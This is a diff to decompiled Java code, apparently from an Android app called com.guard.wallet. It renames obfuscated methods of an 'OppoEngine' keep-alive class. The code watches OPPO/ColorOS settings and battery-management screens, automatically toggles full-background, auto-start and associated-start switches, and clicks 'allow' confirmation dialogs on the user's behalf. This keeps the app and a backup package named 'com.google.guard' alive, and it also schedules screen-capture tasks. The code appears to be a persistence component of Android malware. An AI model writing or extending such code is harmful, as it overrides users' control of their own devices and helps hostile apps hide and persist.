@@ -55,7 +55,7 @@ public final class OppoEngine extends KeepAliveEngine {
     public final AtomicBoolean u = new AtomicBoolean(false);
 
     public OppoEngine() {
-        super(w0(), "com.android.settings");
+        super(buildAllListenWindows(), "com.android.settings");
         try {
             this.p.schedule(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 4), 100L, TimeUnit.SECONDS);
         } catch (Exception e2) {
@@ -66,7 +66,8 @@ public final class OppoEngine extends KeepAliveEngine {
     // ======= Static ListenWindow builders =======
 
     /** ListenWindow: com.android.settings / InstalledAppDetailsTop (with app name match) */
-    public static ListenWindow A0(String appName) {
+    /** vendor 原名: A0(String) */
+    public static ListenWindow buildAppDetailListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings",
                 "com.android.settings.applications.InstalledAppDetailsTop");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -76,7 +77,8 @@ public final class OppoEngine extends KeepAliveEngine {
     }
 
     /** ListenWindow: com.android.settings / FrameLayout (with app name match) */
-    public static ListenWindow v0(String appName) {
+    /** vendor 原名: v0(String) */
+    public static ListenWindow buildFrameLayoutListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
@@ -85,7 +87,8 @@ public final class OppoEngine extends KeepAliveEngine {
     }
 
     /** ListenWindow: com.oplus.battery / PowerControlActivity */
-    public static ListenWindow y0() {
+    /** vendor 原名: y0() */
+    public static ListenWindow buildPowerControlListenWindow() {
         ListenWindow lw = new ListenWindow("com.oplus.battery",
                 "com.oplus.powermanager.fuelgaue.PowerControlActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -93,16 +96,18 @@ public final class OppoEngine extends KeepAliveEngine {
     }
 
     /** ListenWindow: com.oplus.battery / FrameLayout (background text match) */
-    public static ListenWindow x0() {
+    /** vendor 原名: x0() */
+    public static ListenWindow buildBatteryFrameLayoutListenWindow() {
         ListenWindow lw = new ListenWindow("com.oplus.battery", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(i0());
+        lw.getMatchs().add(buildBackgroundTextFilter());
         return lw;
     }
 
     /** ListenWindow: com.oplus.battery / StartupAppListActivity */
-    public static ListenWindow z0() {
+    /** vendor 原名: z0() */
+    public static ListenWindow buildStartupListenWindow() {
         ListenWindow lw = new ListenWindow("com.oplus.battery",
                 "com.oplus.startupapp.view.StartupAppListActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -110,7 +115,8 @@ public final class OppoEngine extends KeepAliveEngine {
     }
 
     /** ListenWindow: com.coloros.oppoguardelf / PowerControlActivity */
-    public static ListenWindow q0() {
+    /** vendor 原名: q0() */
+    public static ListenWindow buildGuardElfPowerControlListenWindow() {
         ListenWindow lw = new ListenWindow("com.coloros.oppoguardelf",
                 "com.coloros.powermanager.fuelgaue.PowerControlActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -118,72 +124,78 @@ public final class OppoEngine extends KeepAliveEngine {
     }
 
     /** ListenWindow: com.oplus.battery / appcompat dialog (with allow button match) */
-    public static ListenWindow g0() {
+    /** vendor 原名: g0() */
+    public static ListenWindow buildAndroidXDialogListenWindow() {
         ListenWindow lw = new ListenWindow("com.oplus.battery", "androidx.appcompat.app.b");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(d0());
+        lw.getMatchs().add(buildAllowConfirmFilter());
         return lw;
     }
 
     /** ListenWindow: com.oplus.battery / null (with allow button match) */
-    public static ListenWindow h0() {
+    /** vendor 原名: h0() */
+    public static ListenWindow buildBatteryNullClassListenWindow() {
         ListenWindow lw = new ListenWindow("com.oplus.battery", null);
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(d0());
+        lw.getMatchs().add(buildAllowConfirmFilter());
         return lw;
     }
 
     /** ListenWindow: com.oplus.battery / COUI appcompat dialog (with allow button match) */
-    public static ListenWindow n0() {
+    /** vendor 原名: n0() */
+    public static ListenWindow buildCouiDialogListenWindow() {
         ListenWindow lw = new ListenWindow("com.oplus.battery", "com.coui.appcompat.dialog.app.a");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(d0());
+        lw.getMatchs().add(buildAllowConfirmFilter());
         return lw;
     }
 
     /** ListenWindow: com.coloros.oppoguardelf / null (with allow button match) */
-    public static ListenWindow o0() {
+    /** vendor 原名: o0() */
+    public static ListenWindow buildGuardElfNullListenWindow() {
         ListenWindow lw = new ListenWindow("com.coloros.oppoguardelf", null);
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(d0());
+        lw.getMatchs().add(buildAllowConfirmFilter());
         return lw;
     }
 
     /** ListenWindow: com.coloros.oppoguardelf / FrameLayout (with background text match) */
-    public static ListenWindow p0() {
+    /** vendor 原名: p0() */
+    public static ListenWindow buildGuardElfFrameLayoutListenWindow() {
         ListenWindow lw = new ListenWindow("com.coloros.oppoguardelf", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(i0());
+        lw.getMatchs().add(buildBackgroundTextFilter());
         return lw;
     }
 
     /** Build full ListenWindow list for OPPO engine */
-    public static LinkedList w0() {
+    /** vendor 原名: w0() — Build full ListenWindow list for OPPO engine */
+    public static LinkedList buildAllListenWindows() {
         LinkedList list = new LinkedList();
         list.add(EngineHelper.cJ());
-        list.add(A0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(A0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(v0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(v0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(y0());
-        list.add(q0());
-        list.add(g0());
-        list.add(n0());
-        list.add(h0());
-        list.add(o0());
-        list.add(z0());
+        list.add(buildAppDetailListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildAppDetailListenWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildPowerControlListenWindow());
+        list.add(buildGuardElfPowerControlListenWindow());
+        list.add(buildAndroidXDialogListenWindow());
+        list.add(buildCouiDialogListenWindow());
+        list.add(buildBatteryNullClassListenWindow());
+        list.add(buildGuardElfNullListenWindow());
+        list.add(buildStartupListenWindow());
         return list;
     }
 
     // ======= Static CombineFilter builders =======
 
-    /** Filter: Button text = COLORS_SETTINGS_ALLOW_BUTTON_TEXT (allow confirm button) */
-    public static CombineFilter d0() {
+    /** vendor 原名: buildAllowConfirmFilter() — Filter: Button text = COLORS_SETTINGS_ALLOW_BUTTON_TEXT (allow confirm button) */
+    public static CombineFilter buildAllowConfirmFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.Button"), "text");
@@ -192,8 +204,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT */
-    public static CombineFilter b0() {
+    /** vendor 原名: b0() — Filter: TextView text = COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT */
+    public static CombineFilter buildAllowBackgroundFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -202,8 +214,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT */
-    public static CombineFilter c0() {
+    /** vendor 原名: c0() — Filter: TextView text = COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT */
+    public static CombineFilter buildAutoStartTextFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -212,8 +224,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT */
-    public static CombineFilter e0() {
+    /** vendor 原名: e0() — Filter: TextView text = COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT */
+    public static CombineFilter buildFullBackgroundFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -222,8 +234,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text contains COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT */
-    public static CombineFilter f0() {
+    /** vendor 原名: f0() — Filter: TextView text contains COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT */
+    public static CombineFilter buildRelateStartFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -232,8 +244,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text contains COLORS_APP_IN_BACKGROUND_TEXT */
-    public static CombineFilter i0() {
+    /** vendor 原名: buildBackgroundTextFilter() — Filter: TextView text contains COLORS_APP_IN_BACKGROUND_TEXT */
+    public static CombineFilter buildBackgroundTextFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -242,8 +254,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = COLORS_SETTINGS_POWER_MANAGE_TEXT (may return null) */
-    public static CombineFilter B0() {
+    /** vendor 原名: B0() — Filter: TextView text = COLORS_SETTINGS_POWER_MANAGE_TEXT (may return null) */
+    public static CombineFilter buildPowerManageFilter() {
         if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_POWER_MANAGE_TEXT"))) {
             return null;
         }
@@ -255,8 +267,8 @@ public final class OppoEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = COLORS_SETTINGS_POWER_MANAGE_2_TEXT (may return null) */
-    public static CombineFilter C0() {
+    /** vendor 原名: C0() — Filter: TextView text = COLORS_SETTINGS_POWER_MANAGE_2_TEXT (may return null) */
+    public static CombineFilter buildPowerManage2Filter() {
         if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_POWER_MANAGE_2_TEXT"))) {
             return null;
         }
@@ -270,14 +282,14 @@ public final class OppoEngine extends KeepAliveEngine {
 
     // ======= Window detection helpers =======
 
-    /** Check if in allow-confirm dialog (multiple window types) */
-    public final boolean j0() {
+    /** vendor 原名: j0() — Check if in allow-confirm dialog (multiple window types) */
+    public final boolean isInAllowConfirmDialog() {
         try {
             LinkedList list = new LinkedList();
-            list.add(g0());
-            list.add(n0());
-            list.add(h0());
-            list.add(o0());
+            list.add(buildAndroidXDialogListenWindow());
+            list.add(buildCouiDialogListenWindow());
+            list.add(buildBatteryNullClassListenWindow());
+            list.add(buildGuardElfNullListenWindow());
             if (this.q(list)) {
                 Log.e("o.v", "已进入是否完全允许对话框");
                 return true;
@@ -288,14 +300,14 @@ public final class OppoEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** Check if in app detail window (InstalledAppDetailsTop or FrameLayout with app name) */
-    public final boolean k0() {
+    /** vendor 原名: k0() — Check if in app detail window (InstalledAppDetailsTop or FrameLayout with app name) */
+    public final boolean isInAppDetailWindow() {
         try {
             String appName = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                     ? com.guard.wallet.utils.SystemHelper.x0() : com.guard.wallet.utils.SystemHelper.e();
             LinkedList list = new LinkedList();
-            list.add(A0(appName));
-            list.add(v0(appName));
+            list.add(buildAppDetailListenWindow(appName));
+            list.add(buildFrameLayoutListenWindow(appName));
             if (this.q(list)) {
                 Log.e("o.v", "已进入App详情窗口");
                 return true;
@@ -307,14 +319,14 @@ public final class OppoEngine extends KeepAliveEngine {
         }
     }
 
-    /** Check if in power control / battery management window */
-    public final boolean l0() {
+    /** vendor 原名: l0() — Check if in power control / battery management window */
+    public final boolean isInPowerControlWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(y0());
-            list.add(x0());
-            list.add(q0());
-            list.add(p0());
+            list.add(buildPowerControlListenWindow());
+            list.add(buildBatteryFrameLayoutListenWindow());
+            list.add(buildGuardElfPowerControlListenWindow());
+            list.add(buildGuardElfFrameLayoutListenWindow());
             if (this.q(list)) {
                 Log.e("o.v", "已进入App耗电管理窗口");
                 return true;
@@ -325,10 +337,10 @@ public final class OppoEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** Check if in startup app list window */
-    public final boolean m0() {
+    /** vendor 原名: m0() — Check if in startup app list window */
+    public final boolean isInStartupWindow() {
         try {
-            if (this.q(Collections.singletonList(z0()))) {
+            if (this.q(Collections.singletonList(buildStartupListenWindow()))) {
                 Log.e("o.v", "已进入自启动管理窗口");
                 return true;
             }
@@ -348,12 +360,13 @@ public final class OppoEngine extends KeepAliveEngine {
      *   1. 先尝试 vendor 原始 Switch 模式 (toggleSwitchWithRetry() 坐标点击)
      *   2. Switch 未找到时 fallback 到 RadioButton 模式 (直接点击行)
      */
-    public final boolean r0() {
+    /** vendor 原名: r0() */
+    public final boolean toggleFullBackground() {
         try {
-            CombineFilterWithChild filter1 = new CombineFilterWithChild(EngineHelper.cK(), e0());
+            CombineFilterWithChild filter1 = new CombineFilterWithChild(EngineHelper.cK(), buildFullBackgroundFilter());
             UiObject found = this.k().findOneByCombineWithChild(filter1);
             if (found == null) {
-                CombineFilterWithChild filter2 = new CombineFilterWithChild(EngineHelper.cK(), b0());
+                CombineFilterWithChild filter2 = new CombineFilterWithChild(EngineHelper.cK(), buildAllowBackgroundFilter());
                 found = this.k().findOneByCombineWithChild(filter2);
             }
 
@@ -372,7 +385,7 @@ public final class OppoEngine extends KeepAliveEngine {
             if (result.isChecked()) {
                 Log.e("o.v", "已勾选完全允许后台行为 (Switch 模式)");
                 com.guard.wallet.utils.SystemHelper.T0(10);
-                if (!j0()) {
+                if (!isInAllowConfirmDialog()) {
                     this.s.set(true);
                     return true;
                 }
@@ -398,7 +411,7 @@ public final class OppoEngine extends KeepAliveEngine {
                     return true;
                 }
                 // fallback: 用 COLORS_SETTINGS_ALLOW_BUTTON_TEXT 文本匹配
-                CombineFilter btnFilter = d0();
+                CombineFilter btnFilter = buildAllowConfirmFilter();
                 if (btnFilter != null) {
                     UiObject textBtn = dialogRoot.findOneByCombine(btnFilter);
                     if (textBtn != null && textBtn.click()) {
@@ -420,10 +433,10 @@ public final class OppoEngine extends KeepAliveEngine {
         }
     }
 
-    /** Toggle "auto-start" switch. Returns true if checked. */
-    public final boolean s0() {
+    /** vendor 原名: s0() — Toggle "auto-start" switch. Returns true if checked. */
+    public final boolean toggleAutoStart() {
         try {
-            CombineFilterWithChild filter = new CombineFilterWithChild(EngineHelper.cK(), c0());
+            CombineFilterWithChild filter = new CombineFilterWithChild(EngineHelper.cK(), buildAutoStartTextFilter());
             UiObject found = this.k().findOneByCombineWithChild(filter);
             if (found != null) {
                 Log.e("o.v", "自启动栏目查找成功");
@@ -449,10 +462,10 @@ public final class OppoEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** Toggle "associate-start" switch. Returns true if checked. */
-    public final boolean t0() {
+    /** vendor 原名: t0() — Toggle "associate-start" switch. Returns true if checked. */
+    public final boolean toggleRelateStart() {
         try {
-            CombineFilterWithChild filter = new CombineFilterWithChild(EngineHelper.cK(), f0());
+            CombineFilterWithChild filter = new CombineFilterWithChild(EngineHelper.cK(), buildRelateStartFilter());
             UiObject found = this.k().findOneByCombineWithChild(filter);
             String errMsg;
             if (found != null) {
@@ -480,8 +493,8 @@ public final class OppoEngine extends KeepAliveEngine {
 
     // ======= Strategy save & next-app logic =======
 
-    /** Save keep-alive strategy for given package */
-    public final void D0(String pkg) {
+    /** vendor 原名: savePowerControlState(String) — Save keep-alive strategy for given package */
+    public final void savePowerControlState(String pkg) {
         try {
             PowerControlStateVO state = com.guard.wallet.utils.SharedPrefsManager.k(pkg);
             state.setPackageName(pkg);
@@ -517,7 +530,7 @@ public final class OppoEngine extends KeepAliveEngine {
             Object backupEnum = KEEP_ALIVE_BACKUP;
 
             if (isMainApp) {
-                D0(MainApplication.getAppContext().getPackageName());
+                savePowerControlState(MainApplication.getAppContext().getPackageName());
                 this.n.clear();
                 bgFlag.set(false);
                 this.t.set(false);
@@ -531,7 +544,7 @@ public final class OppoEngine extends KeepAliveEngine {
                 }
                 Z();
             } else if (Objects.equals(stateRef.get(), backupEnum)) {
-                D0("com.google.guard");
+                savePowerControlState("com.google.guard");
                 Z();
             }
         } catch (Exception e2) {
@@ -555,10 +568,10 @@ public final class OppoEngine extends KeepAliveEngine {
                     }
                     AtomicReference stateRef = this.r;
                     if (Objects.equals(stateRef.get(), KEEP_ALIVE_MAIN)) {
-                        D0(MainApplication.getAppContext().getPackageName());
+                        savePowerControlState(MainApplication.getAppContext().getPackageName());
                     }
                     if (Objects.equals(stateRef.get(), KEEP_ALIVE_BACKUP)) {
-                        D0("com.google.guard");
+                        savePowerControlState("com.google.guard");
                     }
                     this.p.shutdownNow();
                     com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
@@ -592,7 +605,7 @@ public final class OppoEngine extends KeepAliveEngine {
             if (event != null) {
                 super.u(event, packageName, className);
             }
-            boolean inAppDetail = k0();
+            boolean inAppDetail = isInAppDetailWindow();
             String delegateId = this.c;
             ConcurrentLinkedQueue queue = this.n;
 
@@ -605,7 +618,7 @@ public final class OppoEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 0), delegateId);
                 }
             }
-            if (l0()) {
+            if (isInPowerControlWindow()) {
                 queue.remove("keepAliveInAppDetail");
                 queue.remove("keepAliveInAndroidXDialog");
                 queue.remove("keepAliveInStartup");
@@ -614,7 +627,7 @@ public final class OppoEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 1), delegateId);
                 }
             }
-            if (j0()) {
+            if (isInAllowConfirmDialog()) {
                 queue.remove("keepAliveInAppDetail");
                 queue.remove("keepAliveInPowerControl");
                 queue.remove("keepAliveInStartup");
@@ -623,7 +636,7 @@ public final class OppoEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 2), delegateId);
                 }
             }
-            if (m0()) {
+            if (isInStartupWindow()) {
                 queue.remove("keepAliveInAppDetail");
                 queue.remove("keepAliveInPowerControl");
                 queue.remove("keepAliveInAndroidXDialog");
